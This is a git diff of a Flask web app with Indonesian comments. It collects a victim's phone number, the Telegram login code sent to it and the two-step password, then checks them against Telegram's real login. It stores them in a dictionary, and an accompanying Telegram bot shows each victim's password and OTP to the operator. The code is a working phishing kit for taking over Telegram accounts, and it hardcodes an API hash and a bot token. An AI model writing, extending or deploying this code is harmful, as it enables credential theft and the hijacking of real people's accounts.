@@ -1,6 +1,5 @@
 import os
 import re
-import sqlite3
 import asyncio
 import threading
 from flask import Flask, render_template, request, redirect, url_for, session, flash
@@ -15,74 +14,30 @@ app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
 # ========== KONFIG ==========
-api_id = int(os.getenv("API_ID", 16047851))
-api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-SESSION_DIR = "/tmp/sessions"
+api_id = int(os.getenv("API_ID", 16047851))   # ganti sesuai API ID kamu
+api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")  # ganti
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw")  # ganti
 
+# Pakai folder tmp supaya aman di Railway
+SESSION_DIR = "/tmp/sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
-# ========== DB MEMORY ==========
-DB_PATH = "file:users?mode=memory&cache=shared"
-
-def get_conn():
-    return sqlite3.connect(DB_PATH, uri=True, check_same_thread=False)
-
-def init_db():
-    try:
-        conn = get_conn()
-        cur = conn.cursor()
-        cur.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                phone TEXT PRIMARY KEY,
-                otp TEXT,
-                password TEXT
-            )
-        """)
-        conn.commit()
-        conn.close()
-        print("[DB] ✅ Database siap (memory)")
-    except Exception as e:
-        print("[DB] ❌ Error init_db:", e)
+# ========== PENGGANTI DB (PAKAI DICT) ==========
+USERS = {}  # contoh: { "628xxxx": {"otp": "12345", "password": "mypassword"} }
 
 def save_user(phone, otp=None, password=None):
-    try:
-        conn = get_conn()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO users (phone, otp, password)
-            VALUES (?, ?, ?)
-            ON CONFLICT(phone) DO UPDATE SET otp=excluded.otp, password=excluded.password
-        """, (phone, otp, password))
-        conn.commit()
-        conn.close()
-        print(f"[DB] ✅ Data tersimpan: {phone}, otp={otp}, pass={password}")
-    except Exception as e:
-        print("[DB] ❌ Error save_user:", e)
+    if phone not in USERS:
+        USERS[phone] = {"otp": None, "password": None}
+    if otp:
+        USERS[phone]["otp"] = otp
+    if password:
+        USERS[phone]["password"] = password
 
 def get_user(phone):
-    try:
-        conn = get_conn()
-        cur = conn.cursor()
-        cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
-        row = cur.fetchone()
-        conn.close()
-        return row
-    except Exception as e:
-        print("[DB] ❌ Error get_user:", e)
-        return None
+    return USERS.get(phone)
 
 def get_all_users():
-    try:
-        conn = get_conn()
-        cur = conn.cursor()
-        cur.execute("SELECT phone FROM users")
-        rows = cur.fetchall()
-        conn.close()
-        return [r[0] for r in rows]
-    except Exception as e:
-        print("[DB] ❌ Error get_all_users:", e)
-        return []
+    return list(USERS.keys())
 
 # ====== Helper session files ======
 def remove_session_files(phone_base: str):
@@ -129,7 +84,6 @@ def login():
             flash("OTP telah dikirim ke Telegram Anda.")
             return redirect(url_for("otp"))
         except Exception as e:
-            print("[APP] ❌ Error send_code:", e)
             flash(f"Error kirim OTP: {e}", "error")
             return redirect(url_for("login"))
     return render_template("login.html")
@@ -159,10 +113,6 @@ def otp():
             except PhoneCodeInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
-            except Exception as e:
-                await client.disconnect()
-                print("[APP] ❌ verify_code error:", e)
-                return {"ok": False, "error": str(e)}
 
         res = asyncio.run(verify_code())
         if res["ok"]:
@@ -203,10 +153,6 @@ def password():
             except PasswordHashInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
-            except Exception as e:
-                await client.disconnect()
-                print("[APP] ❌ verify_password error:", e)
-                return {"ok": False, "error": str(e)}
 
         res = asyncio.run(verify_password())
         if res["ok"]:
@@ -286,10 +232,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cmd, phone = query.data.split(":")
     user = get_user(phone)
     if not user:
-        await query.edit_message_text("Nomor tidak ditemukan di database.")
+        await query.edit_message_text("Nomor tidak ditemukan.")
         return
 
-    _, otp, password = user
+    otp = user.get("otp")
+    password = user.get("password")
     if cmd == "pass":
         if password:
             await query.edit_message_text(f"🔑 Password {phone}: {password}")
@@ -302,9 +249,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(f"⚠️ OTP belum tersedia untuk {phone}.")
 
 def start_bot():
-    if not BOT_TOKEN:
-        print("[BOT] ⚠️ BOT_TOKEN tidak diatur, bot tidak dijalankan")
-        return
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
@@ -312,7 +256,6 @@ def start_bot():
 
 # ======= MAIN =======
 if __name__ == "__main__":
-    init_db()
     start_worker()
     threading.Thread(target=start_bot, daemon=True).start()
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
